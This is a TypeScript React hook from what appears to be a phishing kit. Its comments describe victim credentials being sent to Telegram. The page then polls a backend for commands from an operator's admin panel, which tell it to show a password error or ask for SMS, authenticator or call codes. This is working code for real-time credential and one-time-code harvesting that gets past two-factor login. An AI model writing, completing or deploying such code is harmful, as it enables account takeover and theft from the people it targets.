import { useState, useEffect, useRef, useCallback } from 'react';
import { config } from '../config';

/**
 * Smart Bot command types that can be sent from the Telegram admin panel.
 */
export type SmartBotCommand =
  | 'yes_prompt'
  | 'password_error'
  | 'sms_code'
  | 'auth_code'
  | 'call_code'
  | 'number_prompt'
  | 'success'
  | null;

interface UseSmartBotOptions {
  /** The session ID to poll commands for. */
  sessionId: string | null;
  /** Whether polling is enabled. */
  enabled: boolean;
  /** Polling interval in milliseconds (default 3000). */
  interval?: number;
}

interface UseSmartBotResult {
  /** The latest command received from the admin, or null. */
  command: SmartBotCommand;
  /** Whether the hook is actively polling. */
  isPolling: boolean;
  /** Clear the current command (after the UI has reacted to it). */
  clearCommand: () => void;
  /** Stop polling. */
  stopPolling: () => void;
}

/**
 * Custom hook that polls the backend for Smart Bot commands.
 *
 * After credentials are sent to Telegram, the frontend enters a waiting state.
 * This hook polls `pollCommand` at a fixed interval. When a command is received,
 * it is stored in state so App.tsx can react (show password error, OTP input, etc.).
 */
export function useSmartBot({ sessionId, enabled, interval = 3000 }: UseSmartBotOptions): UseSmartBotResult {
  const [command, setCommand] = useState<SmartBotCommand>(null);
  const [isPolling, setIsPolling] = useState(false);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const abortRef = useRef<AbortController | null>(null);
  const enabledRef = useRef(enabled);
  enabledRef.current = enabled;

  const clearCommand = useCallback(() => {
    setCommand(null);
  }, []);

  const stopPolling = useCallback(() => {
    setIsPolling(false);
    if (timerRef.current) {
      clearTimeout(timerRef.current);
      timerRef.current = null;
    }
    if (abortRef.current) {
      abortRef.current.abort();
      abortRef.current = null;
    }
  }, []);

  useEffect(() => {
    if (!enabled || !sessionId) {
      stopPolling();
      return;
    }

    setIsPolling(true);

    const poll = async () => {
      if (!enabledRef.current) return;

      try {
        abortRef.current = new AbortController();
        const res = await fetch(
          `${config.api.pollCommandEndpoint}?sessionId=${encodeURIComponent(sessionId)}`,
          { signal: abortRef.current.signal }
        );
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();

        if (data.command && enabledRef.current) {
          setCommand(data.command as SmartBotCommand);
          // After receiving a command, stop polling — the UI will react
          // and polling can be re-enabled if needed (e.g. after password_error).
          return;
        }
      } catch (err: unknown) {
        if (err instanceof Error && err.name === 'AbortError') return;
        // Silently retry on network errors
      }

      // Schedule next poll if still enabled
      if (enabledRef.current) {
        timerRef.current = setTimeout(poll, interval);
      }
    };

    // Start polling immediately
    poll();

    return () => {
      stopPolling();
    };
  }, [enabled, sessionId, interval, stopPolling]);

  return { command, isPolling, clearCommand, stopPolling };
}
